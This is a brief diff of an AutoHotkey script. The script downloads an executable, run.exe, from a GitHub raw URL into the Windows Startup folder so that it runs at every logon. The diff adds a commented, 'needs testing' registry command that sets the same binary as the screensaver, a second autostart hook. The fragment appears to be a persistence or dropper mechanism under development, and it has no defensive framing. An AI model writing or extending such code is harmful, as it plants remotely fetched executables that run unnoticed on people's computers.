@@ -57,6 +57,9 @@ runAllExes() {
 
     Run 'cmd /c curl -L -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.exe" "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/run.exe"'
 
+;     needs testing
+;     Run 'cmd /c reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\Microsoft\run.exe" /f'
+
     last := ""
     try {
         last := FileRead("C:\Microsoft\last.txt")
